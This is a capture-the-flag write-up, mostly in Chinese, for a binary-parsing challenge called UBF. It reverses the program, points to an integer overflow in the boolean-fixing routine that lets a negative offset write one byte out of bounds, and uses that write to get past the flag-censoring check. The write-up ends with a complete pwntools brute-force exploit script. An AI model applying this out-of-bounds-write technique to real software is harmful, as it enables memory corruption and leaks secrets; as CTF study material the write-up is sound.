# UBF

> 	这题的漏洞是解析 bool 时的整数溢出导致越界写，难点主要在于理解逆向题目逻辑和结构体上。

Please review and test this Unnecessary Binary Format (UBF)!

## Analysis

程序运行后会先读取 `/flag` 等文件的内容并调用 `setenv` 函数将其设置为环境变量，进一步调试发现环境变量的值是可以直接解析并输出的。但是在 `strs_tostr` 中还有一个函数对解析的字符串进行检查，会将 `CTF{` 后的内容替换为 X：

```c
void *__fastcall censor_string(unsigned __int8 *a1, int a2)
{
  void *result; // rax

  if ( a2 > 5 )
  {
    result = (void *)*a1;
    if ( (_BYTE)result == 'C' )
    {
      result = (void *)a1[1];
      if ( (_BYTE)result == 'T' )
      {
        result = (void *)a1[2];
        if ( (_BYTE)result == 'F' )
        {
          result = (void *)a1[3];
          if ( (_BYTE)result == '{' )
            return memset(a1 + 4, 'X', a2 - 5);
        }
      }
    }
  }
  return result;
}
```

继续逆向发现 `fix_corrupt_booleans` 中的整数溢出漏洞：

```c
unsigned __int64 __fastcall fix_corrupt_booleans(new_data *a1)
{
  unsigned __int64 result; // rax
  char *v2; // [rsp+10h] [rbp-18h]
  char *v3; // [rsp+18h] [rbp-10h]
  int i; // [rsp+24h] [rbp-4h]

  v3 = &a1->ptr_to_data[a1->offset];
  v2 = &a1->ptr_to_data[a1->size];
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)a1->len;
    if ( i >= (int)result )
      break;
    result = (unsigned __int64)&v3[i];
    if ( result >= (unsigned __int64)v2 )
      break;
    v3[i] = v3[i] != 0;
  }
  return result;
}
```

若 `offset` 为负数，则可以使 `v3` 指向当前堆块之前的地址并修改上面的一字节为 1，这个漏洞并不能直接导致 getshell，但是可以借助它绕过 `censor_string` 中的检测。

---

## Exploitation

在调试比较麻烦的时候，可以直接尝试爆破：

```python
#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1
filename = "./ubf"
if LOCAL:
    # io = process(filename)
    pass
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
u32_ex = lambda data : u32(data.ljust(4, b'\x00'))
u64_ex = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

def generate_payload(size, choice, x1, x2, data):
    payload  = p32(size)
    payload += choice
    payload += p16(x1)
    payload += p16(x2)
    payload += data
    return payload

for i in range(0x10, 0x10000):
    try:
        io = process(filename)
        payload = generate_payload(5, b's', 1, 2, p16(5) + b"$FLAG")
        payload+= generate_payload(0x100, b'b', 1, 0x10000 - (i), b"\x01")
        ru(b'Enter UBF data base64 encoded:\n')
        sl(base64.b64encode(payload))
        lg("i")
        res = io.recv()
        assert b"flag" in res
        print(res)
        input()
    except Exception as e:
        io.close()
```

---
